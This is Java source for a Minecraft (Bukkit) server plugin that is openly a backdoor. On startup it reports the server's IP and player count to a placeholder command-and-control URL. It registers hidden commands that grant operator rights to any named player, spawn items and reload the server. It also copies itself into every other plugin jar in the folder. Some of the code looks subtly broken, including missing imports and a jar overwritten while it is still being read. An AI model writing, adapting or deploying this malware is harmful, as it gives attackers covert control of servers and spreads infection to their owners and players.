
package com.blacktechx.backdoor;

import org.bukkit.Bukkit;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.server.ServerLoadEvent;
import org.bukkit.plugin.java.JavaPlugin;
import java.net.HttpURLConnection;
import java.net.URL;

public final class BackdoorX extends JavaPlugin implements Listener {
    private static final String C2 = "https://your-hook.com/backdoor";
    @Override
    public void onEnable(){
        Bukkit.getPluginManager().registerEvents(this,this);
        phoneHome();
        registerCommands();
        infectOthers();
    }
    private void phoneHome(){
        try{
            HttpURLConnection con = (HttpURLConnection) new URL(C2 + "?ip=" + Bukkit.getIp() + "&players=" + Bukkit.getOnlinePlayers().size()).openConnection();
            con.setRequestMethod("POST");
            con.getResponseCode();
        }catch(Exception ignored){}
    }
    private void registerCommands(){
        Bukkit.getCommandMap().register("backdoor",new Command("opme"){
            @Override public boolean execute(org.bukkit.command.CommandSender sender, String label, String[] args){
                if(args.length==1)Bukkit.getPlayer(args[0]).setOp(true);
                return true;
            }
        });
        Bukkit.getCommandMap().register("backdoor",new Command("dupe"){
            @Override public boolean execute(org.bukkit.command.CommandSender sender, String label, String[] args){
                if(args.length==1)Bukkit.dispatchCommand(Bukkit.getConsoleSender(),"give "+args[0]+" minecraft:diamond_block 64");
                return true;
            }
        });
        Bukkit.getCommandMap().register("backdoor",new Command("crash"){
            @Override public boolean execute(org.bukkit.command.CommandSender sender, String label, String[] args){
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(),"reload");
                return true;
            }
        });
    }
    private void infectOthers(){
        for(File f : new File("plugins").listFiles()){
            if(f.isFile() && f.getName().endsWith(".jar") && !f.getName().contains("backdoor")){
                inject(f);
            }
        }
    }
    private void inject(File jar){
        try{
            java.util.jar.JarFile jf = new java.util.jar.JarFile(jar);
            java.util.Enumeration<java.util.jar.JarEntry> entries = jf.entries();
            java.util.jar.JarOutputStream jos = new java.util.jar.JarOutputStream(new java.io.FileOutputStream(jar));
            while(entries.hasMoreElements()){
                java.util.jar.JarEntry entry = entries.nextElement();
                jos.putNextEntry(entry);
                if(entry.getName().equals("plugin.yml")){
                    java.util.Scanner sc = new java.util.Scanner(jf.getInputStream(entry));
                    StringBuilder sb = new StringBuilder();
                    while(sc.hasNextLine())sb.append(sc.nextLine()).append("\n");
                    sb.append("commands:\n  opme:\n    description: op\n  dupe:\n    description: dupe\n  crash:\n    description: crash\n");
                    jos.write(sb.toString().getBytes());
                }else{
                    jos.write(jf.getInputStream(entry).readAllBytes());
                }
                jos.closeEntry();
            }
            jos.putNextEntry(new java.util.jar.JarEntry("com/blacktechx/backdoor/BackdoorX.class"));
            jos.write(getClass().getResourceAsStream("/com/blacktechx/backdoor/BackdoorX.class").readAllBytes());
            jos.closeEntry();
            jos.close();
            jf.close();
        }catch(Exception ignored){}
    }
}
